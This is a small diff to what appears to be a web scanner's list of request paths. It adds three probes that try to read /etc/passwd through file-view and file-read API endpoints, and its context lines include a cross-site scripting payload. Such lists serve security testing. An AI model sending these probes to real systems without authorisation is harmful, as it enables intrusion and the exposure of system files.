@@ -59,3 +59,6 @@
 /response-headers?Content-Type=text/html&Server=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /steve/services/
 /services/
+/api/fs/read?allowOutsideWorkspace=true&path=/etc/passwd
+/api/system/fileView?file=/etc/passwd
+/api/system/fileDownload?file=/etc/passwd
